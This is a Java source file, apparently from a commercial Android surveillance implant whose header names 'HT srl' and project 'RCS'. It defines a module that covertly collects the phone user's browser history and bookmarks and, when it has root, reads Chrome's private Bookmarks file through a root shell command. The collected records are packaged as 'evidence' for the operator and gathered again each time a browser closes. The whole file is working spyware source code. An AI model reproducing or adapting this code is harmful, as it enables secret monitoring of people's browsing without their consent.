/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.database.Cursor;
import android.provider.Browser;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.evidence.Markup;
import com.android.dvci.interfaces.IncrementalLog;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;

import org.json.JSONObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import java.util.ArrayList;
import java.util.Date;

import javax.xml.parsers.DocumentBuilderFactory;


public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {

	private static final String TAG = "ModuleUrl"; //$NON-NLS-1$

	int VERSION_DELIMITER = 0x20100713;
	private Markup markupUrl;
	//private long lastTimestamp;

	@Override
	public void actualStart() {
		markupUrl = new Markup(this);

		saveUrls(true, true);
		ListenerProcess.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerProcess.self().detach(this);
	}

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(20000);
		return true;
	}

	@Override
	public void actualGo() {

	}

	private synchronized long saveUrlsBrowser(long lastTimestamp) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveUrls), timestamp: " + lastTimestamp);
		}

		String[] proj = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE};
		String sel = Browser.BookmarkColumns.DATE + " > " + lastTimestamp;
		//String sel = null;
		Cursor mCur = Status.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
		mCur.moveToFirst();

		long maxTimestamp = lastTimestamp;

		try {
			if (mCur.moveToFirst() && mCur.getCount() > 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveUrls), records: " + mCur.getCount());
				}
				while (mCur.isAfterLast() == false) {
					String title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
					String url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
					boolean bookmark = mCur.getInt(mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK)) == 1; // 0 = history, 1 = bookmark
					long timestamp = mCur.getLong(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
					maxTimestamp = Math.max(timestamp, maxTimestamp);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveUrls), " + title + " url: " + url + " bookmark: " + bookmark + " timestamp: " + timestamp);
					}

					saveEvidence(title, url, bookmark, new Date(timestamp));
					mCur.moveToNext();
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveUrls), ERROR", ex);
			}
		}

		return maxTimestamp;

	}


	private synchronized long saveUrlsChrome(long lastTimestamp) {

		///data/data/com.android.chrome/app_chrome/Default/Bookmarks
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveUrlsChromer), timestamp: " + lastTimestamp);
		}

		if(Status.haveRoot()){
			ExecuteResult res = Execute.executeRoot("cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks");
			String js = res.getStdout();
			try {
				JSONObject obj = new JSONObject(js);
				//obj.
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (openBBMChatEnc), ERROR", e);
				}
			}
		}

		return lastTimestamp;
	}

	private void saveEvidence(String title, String url, boolean bookmark, Date date) {

		//BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari', 'Browser', 'Web']
		int BROWSER_TYPE = 8;

		final byte[] b_tm = (new DateTime()).getStructTm();
		final byte[] b_url = WChar.getBytes(url.toString(), true);
		final byte[] b_title = WChar.getBytes(title, true); //$NON-NLS-1$
		//final byte[] b_window = WChar.getBytes("", true); //$NON-NLS-1$
		final ArrayList<byte[]> items = new ArrayList<byte[]>();

		EvidenceBuilder evidence;

		synchronized (this) {
			evidence = new EvidenceBuilder(EvidenceType.URL);
		}

		items.add(b_tm);
		items.add(ByteArray.intToByteArray(VERSION_DELIMITER));
		items.add(b_url);
		items.add(ByteArray.intToByteArray(BROWSER_TYPE));
		items.add(b_title);
		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
		}

		synchronized (this) {
			evidence.write(items);
			evidence.close();
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}

		// Do nothing, this log is not incremental anymore
	}

	void saveUrls(boolean browser, boolean chrome) {
		long lastTimestamp = markupUrl.unserialize(new Long(-1));
		long m1 = 0, m2 = 0;
		if (browser) {
			m1 = saveUrlsBrowser(lastTimestamp);
		}
		if (chrome) {
			m2 = saveUrlsChrome(lastTimestamp);
		}

		markupUrl.serialize(Math.max(m1, m2));
	}

	@Override
	public int notification(ProcessInfo info) {
		if (info.status == ProcessStatus.STOP) {

			boolean browser = info.processInfo.contains("browser");
			boolean chrome = info.processInfo.contains("chrome");
			if (browser || chrome) {
				saveUrls(browser, chrome);
			}
		}

		return 0;
	}
}
